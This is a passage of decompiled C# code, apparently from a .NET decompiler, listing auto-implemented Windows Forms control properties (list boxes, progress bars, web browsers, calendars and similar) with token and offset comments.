		// (get) Token: 0x06000611 RID: 1553 RVA: 0x00027706 File Offset: 0x00025906
		// (set) Token: 0x06000612 RID: 1554 RVA: 0x0002770E File Offset: 0x0002590E
		internal virtual CheckedListBox CheckedListBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002FC RID: 764
		// (get) Token: 0x06000613 RID: 1555 RVA: 0x00027717 File Offset: 0x00025917
		// (set) Token: 0x06000614 RID: 1556 RVA: 0x0002771F File Offset: 0x0002591F
		internal virtual ListBox ListBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002FD RID: 765
		// (get) Token: 0x06000615 RID: 1557 RVA: 0x00027728 File Offset: 0x00025928
		// (set) Token: 0x06000616 RID: 1558 RVA: 0x00027730 File Offset: 0x00025930
		internal virtual DateTimePicker DateTimePicker16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002FE RID: 766
		// (get) Token: 0x06000617 RID: 1559 RVA: 0x00027739 File Offset: 0x00025939
		// (set) Token: 0x06000618 RID: 1560 RVA: 0x00027741 File Offset: 0x00025941
		internal virtual ListBox ListBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002FF RID: 767
		// (get) Token: 0x06000619 RID: 1561 RVA: 0x0002774A File Offset: 0x0002594A
		// (set) Token: 0x0600061A RID: 1562 RVA: 0x00027752 File Offset: 0x00025952
		internal virtual Label Label8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000300 RID: 768
		// (get) Token: 0x0600061B RID: 1563 RVA: 0x0002775B File Offset: 0x0002595B
		// (set) Token: 0x0600061C RID: 1564 RVA: 0x00027763 File Offset: 0x00025963
		internal virtual MaskedTextBox MaskedTextBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000301 RID: 769
		// (get) Token: 0x0600061D RID: 1565 RVA: 0x0002776C File Offset: 0x0002596C
		// (set) Token: 0x0600061E RID: 1566 RVA: 0x00027774 File Offset: 0x00025974
		internal virtual RadioButton RadioButton15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000302 RID: 770
		// (get) Token: 0x0600061F RID: 1567 RVA: 0x0002777D File Offset: 0x0002597D
		// (set) Token: 0x06000620 RID: 1568 RVA: 0x00027785 File Offset: 0x00025985
		internal virtual PictureBox PictureBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000303 RID: 771
		// (get) Token: 0x06000621 RID: 1569 RVA: 0x0002778E File Offset: 0x0002598E
		// (set) Token: 0x06000622 RID: 1570 RVA: 0x00027796 File Offset: 0x00025996
		internal virtual MaskedTextBox MaskedTextBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000304 RID: 772
		// (get) Token: 0x06000623 RID: 1571 RVA: 0x0002779F File Offset: 0x0002599F
		// (set) Token: 0x06000624 RID: 1572 RVA: 0x000277A7 File Offset: 0x000259A7
		internal virtual WebBrowser WebBrowser8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000305 RID: 773
		// (get) Token: 0x06000625 RID: 1573 RVA: 0x000277B0 File Offset: 0x000259B0
		// (set) Token: 0x06000626 RID: 1574 RVA: 0x000277B8 File Offset: 0x000259B8
		internal virtual TreeView TreeView8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000306 RID: 774
		// (get) Token: 0x06000627 RID: 1575 RVA: 0x000277C1 File Offset: 0x000259C1
		// (set) Token: 0x06000628 RID: 1576 RVA: 0x000277C9 File Offset: 0x000259C9
		internal virtual PictureBox PictureBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000307 RID: 775
		// (get) Token: 0x06000629 RID: 1577 RVA: 0x000277D2 File Offset: 0x000259D2
		// (set) Token: 0x0600062A RID: 1578 RVA: 0x000277DA File Offset: 0x000259DA
		internal virtual NumericUpDown NumericUpDown8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000308 RID: 776
		// (get) Token: 0x0600062B RID: 1579 RVA: 0x000277E3 File Offset: 0x000259E3
		// (set) Token: 0x0600062C RID: 1580 RVA: 0x000277EB File Offset: 0x000259EB
		internal virtual ProgressBar ProgressBar31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000309 RID: 777
		// (get) Token: 0x0600062D RID: 1581 RVA: 0x000277F4 File Offset: 0x000259F4
		// (set) Token: 0x0600062E RID: 1582 RVA: 0x000277FC File Offset: 0x000259FC
		internal virtual RadioButton RadioButton16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700030A RID: 778
		// (get) Token: 0x0600062F RID: 1583 RVA: 0x00027805 File Offset: 0x00025A05
		// (set) Token: 0x06000630 RID: 1584 RVA: 0x0002780D File Offset: 0x00025A0D
		internal virtual LinkLabel LinkLabel22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700030B RID: 779
		// (get) Token: 0x06000631 RID: 1585 RVA: 0x00027816 File Offset: 0x00025A16
		// (set) Token: 0x06000632 RID: 1586 RVA: 0x0002781E File Offset: 0x00025A1E
		internal virtual CheckBox CheckBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700030C RID: 780
		// (get) Token: 0x06000633 RID: 1587 RVA: 0x00027827 File Offset: 0x00025A27
		// (set) Token: 0x06000634 RID: 1588 RVA: 0x0002782F File Offset: 0x00025A2F
		internal virtual ComboBox ComboBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700030D RID: 781
		// (get) Token: 0x06000635 RID: 1589 RVA: 0x00027838 File Offset: 0x00025A38
		// (set) Token: 0x06000636 RID: 1590 RVA: 0x00027840 File Offset: 0x00025A40
		internal virtual Button Button15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700030E RID: 782
		// (get) Token: 0x06000637 RID: 1591 RVA: 0x00027849 File Offset: 0x00025A49
		// (set) Token: 0x06000638 RID: 1592 RVA: 0x00027851 File Offset: 0x00025A51
		internal virtual CheckedListBox CheckedListBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700030F RID: 783
		// (get) Token: 0x06000639 RID: 1593 RVA: 0x0002785A File Offset: 0x00025A5A
		// (set) Token: 0x0600063A RID: 1594 RVA: 0x00027862 File Offset: 0x00025A62
		internal virtual ComboBox ComboBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000310 RID: 784
		// (get) Token: 0x0600063B RID: 1595 RVA: 0x0002786B File Offset: 0x00025A6B
		// (set) Token: 0x0600063C RID: 1596 RVA: 0x00027873 File Offset: 0x00025A73
		internal virtual MonthCalendar MonthCalendar16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000311 RID: 785
		// (get) Token: 0x0600063D RID: 1597 RVA: 0x0002787C File Offset: 0x00025A7C
		// (set) Token: 0x0600063E RID: 1598 RVA: 0x00027884 File Offset: 0x00025A84
		internal virtual MonthCalendar MonthCalendar17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000312 RID: 786
		// (get) Token: 0x0600063F RID: 1599 RVA: 0x0002788D File Offset: 0x00025A8D
		// (set) Token: 0x06000640 RID: 1600 RVA: 0x00027895 File Offset: 0x00025A95
		internal virtual LinkLabel LinkLabel23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000313 RID: 787
		// (get) Token: 0x06000641 RID: 1601 RVA: 0x0002789E File Offset: 0x00025A9E
		// (set) Token: 0x06000642 RID: 1602 RVA: 0x000278A6 File Offset: 0x00025AA6
		internal virtual ProgressBar ProgressBar32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000314 RID: 788
		// (get) Token: 0x06000643 RID: 1603 RVA: 0x000278AF File Offset: 0x00025AAF
		// (set) Token: 0x06000644 RID: 1604 RVA: 0x000278B7 File Offset: 0x00025AB7
		internal virtual LinkLabel LinkLabel24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000315 RID: 789
		// (get) Token: 0x06000645 RID: 1605 RVA: 0x000278C0 File Offset: 0x00025AC0
		// (set) Token: 0x06000646 RID: 1606 RVA: 0x000278C8 File Offset: 0x00025AC8
		internal virtual ListBox ListBox24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000316 RID: 790
		// (get) Token: 0x06000647 RID: 1607 RVA: 0x000278D1 File Offset: 0x00025AD1
		// (set) Token: 0x06000648 RID: 1608 RVA: 0x000278D9 File Offset: 0x00025AD9
		internal virtual CheckBox CheckBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000317 RID: 791
		// (get) Token: 0x06000649 RID: 1609 RVA: 0x000278E2 File Offset: 0x00025AE2
		// (set) Token: 0x0600064A RID: 1610 RVA: 0x000278EA File Offset: 0x00025AEA
		internal virtual CheckedListBox CheckedListBox24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000318 RID: 792
		// (get) Token: 0x0600064B RID: 1611 RVA: 0x000278F3 File Offset: 0x00025AF3
		// (set) Token: 0x0600064C RID: 1612 RVA: 0x000278FB File Offset: 0x00025AFB
		internal virtual Button Button16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000319 RID: 793
		// (get) Token: 0x0600064D RID: 1613 RVA: 0x00027904 File Offset: 0x00025B04
		// (set) Token: 0x0600064E RID: 1614 RVA: 0x0002790C File Offset: 0x00025B0C
		internal virtual ProgressBar ProgressBar33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700031A RID: 794
		// (get) Token: 0x0600064F RID: 1615 RVA: 0x00027915 File Offset: 0x00025B15
		// (set) Token: 0x06000650 RID: 1616 RVA: 0x0002791D File Offset: 0x00025B1D
		internal virtual ProgressBar ProgressBar34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700031B RID: 795
		// (get) Token: 0x06000651 RID: 1617 RVA: 0x00027926 File Offset: 0x00025B26
		// (set) Token: 0x06000652 RID: 1618 RVA: 0x0002792E File Offset: 0x00025B2E
		internal virtual DateTimePicker DateTimePicker17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700031C RID: 796
		// (get) Token: 0x06000653 RID: 1619 RVA: 0x00027937 File Offset: 0x00025B37
		// (set) Token: 0x06000654 RID: 1620 RVA: 0x0002793F File Offset: 0x00025B3F
		internal virtual CheckedListBox CheckedListBox25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700031D RID: 797
		// (get) Token: 0x06000655 RID: 1621 RVA: 0x00027948 File Offset: 0x00025B48
		// (set) Token: 0x06000656 RID: 1622 RVA: 0x00027950 File Offset: 0x00025B50
		internal virtual ListBox ListBox25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700031E RID: 798
		// (get) Token: 0x06000657 RID: 1623 RVA: 0x00027959 File Offset: 0x00025B59
		// (set) Token: 0x06000658 RID: 1624 RVA: 0x00027961 File Offset: 0x00025B61
		internal virtual DateTimePicker DateTimePicker18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700031F RID: 799
		// (get) Token: 0x06000659 RID: 1625 RVA: 0x0002796A File Offset: 0x00025B6A
		// (set) Token: 0x0600065A RID: 1626 RVA: 0x00027972 File Offset: 0x00025B72
		internal virtual ListBox ListBox26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000320 RID: 800
		// (get) Token: 0x0600065B RID: 1627 RVA: 0x0002797B File Offset: 0x00025B7B
		// (set) Token: 0x0600065C RID: 1628 RVA: 0x00027983 File Offset: 0x00025B83
		internal virtual Label Label9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000321 RID: 801
		// (get) Token: 0x0600065D RID: 1629 RVA: 0x0002798C File Offset: 0x00025B8C
		// (set) Token: 0x0600065E RID: 1630 RVA: 0x00027994 File Offset: 0x00025B94
		internal virtual MaskedTextBox MaskedTextBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000322 RID: 802
		// (get) Token: 0x0600065F RID: 1631 RVA: 0x0002799D File Offset: 0x00025B9D
		// (set) Token: 0x06000660 RID: 1632 RVA: 0x000279A5 File Offset: 0x00025BA5
		internal virtual RadioButton RadioButton17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000323 RID: 803
		// (get) Token: 0x06000661 RID: 1633 RVA: 0x000279AE File Offset: 0x00025BAE
		// (set) Token: 0x06000662 RID: 1634 RVA: 0x000279B6 File Offset: 0x00025BB6
		internal virtual PictureBox PictureBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000324 RID: 804
		// (get) Token: 0x06000663 RID: 1635 RVA: 0x000279BF File Offset: 0x00025BBF
		// (set) Token: 0x06000664 RID: 1636 RVA: 0x000279C7 File Offset: 0x00025BC7
		internal virtual MaskedTextBox MaskedTextBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000325 RID: 805
		// (get) Token: 0x06000665 RID: 1637 RVA: 0x000279D0 File Offset: 0x00025BD0
		// (set) Token: 0x06000666 RID: 1638 RVA: 0x000279D8 File Offset: 0x00025BD8
		internal virtual WebBrowser WebBrowser9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000326 RID: 806
		// (get) Token: 0x06000667 RID: 1639 RVA: 0x000279E1 File Offset: 0x00025BE1
		// (set) Token: 0x06000668 RID: 1640 RVA: 0x000279E9 File Offset: 0x00025BE9
		internal virtual TreeView TreeView9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000327 RID: 807
		// (get) Token: 0x06000669 RID: 1641 RVA: 0x000279F2 File Offset: 0x00025BF2
		// (set) Token: 0x0600066A RID: 1642 RVA: 0x000279FA File Offset: 0x00025BFA
		internal virtual PictureBox PictureBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000328 RID: 808
		// (get) Token: 0x0600066B RID: 1643 RVA: 0x00027A03 File Offset: 0x00025C03
		// (set) Token: 0x0600066C RID: 1644 RVA: 0x00027A0B File Offset: 0x00025C0B
		internal virtual NumericUpDown NumericUpDown9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000329 RID: 809
		// (get) Token: 0x0600066D RID: 1645 RVA: 0x00027A14 File Offset: 0x00025C14
		// (set) Token: 0x0600066E RID: 1646 RVA: 0x00027A1C File Offset: 0x00025C1C
		internal virtual ProgressBar ProgressBar35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700032A RID: 810
		// (get) Token: 0x0600066F RID: 1647 RVA: 0x00027A25 File Offset: 0x00025C25
		// (set) Token: 0x06000670 RID: 1648 RVA: 0x00027A2D File Offset: 0x00025C2D
		internal virtual RadioButton RadioButton18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700032B RID: 811
		// (get) Token: 0x06000671 RID: 1649 RVA: 0x00027A36 File Offset: 0x00025C36
		// (set) Token: 0x06000672 RID: 1650 RVA: 0x00027A3E File Offset: 0x00025C3E
		internal virtual LinkLabel LinkLabel25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700032C RID: 812
		// (get) Token: 0x06000673 RID: 1651 RVA: 0x00027A47 File Offset: 0x00025C47
		// (set) Token: 0x06000674 RID: 1652 RVA: 0x00027A4F File Offset: 0x00025C4F
		internal virtual CheckBox CheckBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700032D RID: 813
		// (get) Token: 0x06000675 RID: 1653 RVA: 0x00027A58 File Offset: 0x00025C58
		// (set) Token: 0x06000676 RID: 1654 RVA: 0x00027A60 File Offset: 0x00025C60
		internal virtual ComboBox ComboBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700032E RID: 814
		// (get) Token: 0x06000677 RID: 1655 RVA: 0x00027A69 File Offset: 0x00025C69
		// (set) Token: 0x06000678 RID: 1656 RVA: 0x00027A71 File Offset: 0x00025C71
		internal virtual Button Button17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700032F RID: 815
		// (get) Token: 0x06000679 RID: 1657 RVA: 0x00027A7A File Offset: 0x00025C7A
		// (set) Token: 0x0600067A RID: 1658 RVA: 0x00027A82 File Offset: 0x00025C82
		internal virtual CheckedListBox CheckedListBox26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000330 RID: 816
		// (get) Token: 0x0600067B RID: 1659 RVA: 0x00027A8B File Offset: 0x00025C8B
		// (set) Token: 0x0600067C RID: 1660 RVA: 0x00027A93 File Offset: 0x00025C93
		internal virtual ComboBox ComboBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000331 RID: 817
		// (get) Token: 0x0600067D RID: 1661 RVA: 0x00027A9C File Offset: 0x00025C9C
		// (set) Token: 0x0600067E RID: 1662 RVA: 0x00027AA4 File Offset: 0x00025CA4
		internal virtual MonthCalendar MonthCalendar18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000332 RID: 818
		// (get) Token: 0x0600067F RID: 1663 RVA: 0x00027AAD File Offset: 0x00025CAD
		// (set) Token: 0x06000680 RID: 1664 RVA: 0x00027AB5 File Offset: 0x00025CB5
		internal virtual MonthCalendar MonthCalendar19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000333 RID: 819
		// (get) Token: 0x06000681 RID: 1665 RVA: 0x00027ABE File Offset: 0x00025CBE
		// (set) Token: 0x06000682 RID: 1666 RVA: 0x00027AC6 File Offset: 0x00025CC6
		internal virtual LinkLabel LinkLabel26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000334 RID: 820
		// (get) Token: 0x06000683 RID: 1667 RVA: 0x00027ACF File Offset: 0x00025CCF
		// (set) Token: 0x06000684 RID: 1668 RVA: 0x00027AD7 File Offset: 0x00025CD7
		internal virtual ProgressBar ProgressBar36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000335 RID: 821
		// (get) Token: 0x06000685 RID: 1669 RVA: 0x00027AE0 File Offset: 0x00025CE0
		// (set) Token: 0x06000686 RID: 1670 RVA: 0x00027AE8 File Offset: 0x00025CE8
		internal virtual LinkLabel LinkLabel27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000336 RID: 822
		// (get) Token: 0x06000687 RID: 1671 RVA: 0x00027AF1 File Offset: 0x00025CF1
		// (set) Token: 0x06000688 RID: 1672 RVA: 0x00027AF9 File Offset: 0x00025CF9
		internal virtual ListBox ListBox27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000337 RID: 823
		// (get) Token: 0x06000689 RID: 1673 RVA: 0x00027B02 File Offset: 0x00025D02
		// (set) Token: 0x0600068A RID: 1674 RVA: 0x00027B0A File Offset: 0x00025D0A
		internal virtual CheckBox CheckBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000338 RID: 824
		// (get) Token: 0x0600068B RID: 1675 RVA: 0x00027B13 File Offset: 0x00025D13
		// (set) Token: 0x0600068C RID: 1676 RVA: 0x00027B1B File Offset: 0x00025D1B
		internal virtual CheckedListBox CheckedListBox27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000339 RID: 825
		// (get) Token: 0x0600068D RID: 1677 RVA: 0x00027B24 File Offset: 0x00025D24
		// (set) Token: 0x0600068E RID: 1678 RVA: 0x00027B2C File Offset: 0x00025D2C
		internal virtual Button Button18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700033A RID: 826
		// (get) Token: 0x0600068F RID: 1679 RVA: 0x00027B35 File Offset: 0x00025D35
		// (set) Token: 0x06000690 RID: 1680 RVA: 0x00027B3D File Offset: 0x00025D3D
		internal virtual ProgressBar ProgressBar37 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700033B RID: 827
		// (get) Token: 0x06000691 RID: 1681 RVA: 0x00027B46 File Offset: 0x00025D46
		// (set) Token: 0x06000692 RID: 1682 RVA: 0x00027B4E File Offset: 0x00025D4E
		internal virtual ProgressBar ProgressBar38 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700033C RID: 828
		// (get) Token: 0x06000693 RID: 1683 RVA: 0x00027B57 File Offset: 0x00025D57
		// (set) Token: 0x06000694 RID: 1684 RVA: 0x00027B5F File Offset: 0x00025D5F
		internal virtual DateTimePicker DateTimePicker19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700033D RID: 829
		// (get) Token: 0x06000695 RID: 1685 RVA: 0x00027B68 File Offset: 0x00025D68
		// (set) Token: 0x06000696 RID: 1686 RVA: 0x00027B70 File Offset: 0x00025D70
		internal virtual CheckedListBox CheckedListBox28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700033E RID: 830
		// (get) Token: 0x06000697 RID: 1687 RVA: 0x00027B79 File Offset: 0x00025D79
		// (set) Token: 0x06000698 RID: 1688 RVA: 0x00027B81 File Offset: 0x00025D81
		internal virtual ListBox ListBox28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700033F RID: 831
		// (get) Token: 0x06000699 RID: 1689 RVA: 0x00027B8A File Offset: 0x00025D8A
		// (set) Token: 0x0600069A RID: 1690 RVA: 0x00027B92 File Offset: 0x00025D92
		internal virtual DateTimePicker DateTimePicker20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000340 RID: 832
		// (get) Token: 0x0600069B RID: 1691 RVA: 0x00027B9B File Offset: 0x00025D9B
		// (set) Token: 0x0600069C RID: 1692 RVA: 0x00027BA3 File Offset: 0x00025DA3
		internal virtual ListBox ListBox29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000341 RID: 833
		// (get) Token: 0x0600069D RID: 1693 RVA: 0x00027BAC File Offset: 0x00025DAC
		// (set) Token: 0x0600069E RID: 1694 RVA: 0x00027BB4 File Offset: 0x00025DB4
		internal virtual Label Label10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000342 RID: 834
		// (get) Token: 0x0600069F RID: 1695 RVA: 0x00027BBD File Offset: 0x00025DBD
		// (set) Token: 0x060006A0 RID: 1696 RVA: 0x00027BC5 File Offset: 0x00025DC5
		internal virtual MaskedTextBox MaskedTextBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000343 RID: 835
		// (get) Token: 0x060006A1 RID: 1697 RVA: 0x00027BCE File Offset: 0x00025DCE
		// (set) Token: 0x060006A2 RID: 1698 RVA: 0x00027BD6 File Offset: 0x00025DD6
		internal virtual RadioButton RadioButton19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000344 RID: 836
		// (get) Token: 0x060006A3 RID: 1699 RVA: 0x00027BDF File Offset: 0x00025DDF
		// (set) Token: 0x060006A4 RID: 1700 RVA: 0x00027BE7 File Offset: 0x00025DE7
		internal virtual PictureBox PictureBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000345 RID: 837
		// (get) Token: 0x060006A5 RID: 1701 RVA: 0x00027BF0 File Offset: 0x00025DF0
		// (set) Token: 0x060006A6 RID: 1702 RVA: 0x00027BF8 File Offset: 0x00025DF8
		internal virtual MaskedTextBox MaskedTextBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000346 RID: 838
		// (get) Token: 0x060006A7 RID: 1703 RVA: 0x00027C01 File Offset: 0x00025E01
		// (set) Token: 0x060006A8 RID: 1704 RVA: 0x00027C09 File Offset: 0x00025E09
		internal virtual WebBrowser WebBrowser10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000347 RID: 839
		// (get) Token: 0x060006A9 RID: 1705 RVA: 0x00027C12 File Offset: 0x00025E12
		// (set) Token: 0x060006AA RID: 1706 RVA: 0x00027C1A File Offset: 0x00025E1A
		internal virtual TreeView TreeView10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000348 RID: 840
		// (get) Token: 0x060006AB RID: 1707 RVA: 0x00027C23 File Offset: 0x00025E23
		// (set) Token: 0x060006AC RID: 1708 RVA: 0x00027C2B File Offset: 0x00025E2B
		internal virtual PictureBox PictureBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000349 RID: 841
		// (get) Token: 0x060006AD RID: 1709 RVA: 0x00027C34 File Offset: 0x00025E34
		// (set) Token: 0x060006AE RID: 1710 RVA: 0x00027C3C File Offset: 0x00025E3C
		internal virtual NumericUpDown NumericUpDown10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700034A RID: 842
		// (get) Token: 0x060006AF RID: 1711 RVA: 0x00027C45 File Offset: 0x00025E45
		// (set) Token: 0x060006B0 RID: 1712 RVA: 0x00027C4D File Offset: 0x00025E4D
		internal virtual ProgressBar ProgressBar39 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700034B RID: 843
		// (get) Token: 0x060006B1 RID: 1713 RVA: 0x00027C56 File Offset: 0x00025E56
		// (set) Token: 0x060006B2 RID: 1714 RVA: 0x00027C5E File Offset: 0x00025E5E
		internal virtual RadioButton RadioButton20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700034C RID: 844
		// (get) Token: 0x060006B3 RID: 1715 RVA: 0x00027C67 File Offset: 0x00025E67
		// (set) Token: 0x060006B4 RID: 1716 RVA: 0x00027C6F File Offset: 0x00025E6F
		internal virtual LinkLabel LinkLabel28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700034D RID: 845
		// (get) Token: 0x060006B5 RID: 1717 RVA: 0x00027C78 File Offset: 0x00025E78
		// (set) Token: 0x060006B6 RID: 1718 RVA: 0x00027C80 File Offset: 0x00025E80
		internal virtual CheckBox CheckBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700034E RID: 846
		// (get) Token: 0x060006B7 RID: 1719 RVA: 0x00027C89 File Offset: 0x00025E89
		// (set) Token: 0x060006B8 RID: 1720 RVA: 0x00027C91 File Offset: 0x00025E91
		internal virtual ComboBox ComboBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700034F RID: 847
		// (get) Token: 0x060006B9 RID: 1721 RVA: 0x00027C9A File Offset: 0x00025E9A
		// (set) Token: 0x060006BA RID: 1722 RVA: 0x00027CA2 File Offset: 0x00025EA2
		internal virtual Button Button19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000350 RID: 848
		// (get) Token: 0x060006BB RID: 1723 RVA: 0x00027CAB File Offset: 0x00025EAB
		// (set) Token: 0x060006BC RID: 1724 RVA: 0x00027CB3 File Offset: 0x00025EB3
		internal virtual CheckedListBox CheckedListBox29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000351 RID: 849
		// (get) Token: 0x060006BD RID: 1725 RVA: 0x00027CBC File Offset: 0x00025EBC
		// (set) Token: 0x060006BE RID: 1726 RVA: 0x00027CC4 File Offset: 0x00025EC4
		internal virtual ComboBox ComboBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000352 RID: 850
		// (get) Token: 0x060006BF RID: 1727 RVA: 0x00027CCD File Offset: 0x00025ECD
		// (set) Token: 0x060006C0 RID: 1728 RVA: 0x00027CD5 File Offset: 0x00025ED5
		internal virtual MonthCalendar MonthCalendar20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000353 RID: 851
		// (get) Token: 0x060006C1 RID: 1729 RVA: 0x00027CDE File Offset: 0x00025EDE
		// (set) Token: 0x060006C2 RID: 1730 RVA: 0x00027CE6 File Offset: 0x00025EE6
		internal virtual MonthCalendar MonthCalendar21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000354 RID: 852
		// (get) Token: 0x060006C3 RID: 1731 RVA: 0x00027CEF File Offset: 0x00025EEF
		// (set) Token: 0x060006C4 RID: 1732 RVA: 0x00027CF7 File Offset: 0x00025EF7
		internal virtual LinkLabel LinkLabel29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000355 RID: 853
		// (get) Token: 0x060006C5 RID: 1733 RVA: 0x00027D00 File Offset: 0x00025F00
		// (set) Token: 0x060006C6 RID: 1734 RVA: 0x00027D08 File Offset: 0x00025F08
		internal virtual ProgressBar ProgressBar40 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000356 RID: 854
		// (get) Token: 0x060006C7 RID: 1735 RVA: 0x00027D11 File Offset: 0x00025F11
		// (set) Token: 0x060006C8 RID: 1736 RVA: 0x00027D19 File Offset: 0x00025F19
		internal virtual LinkLabel LinkLabel30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000357 RID: 855
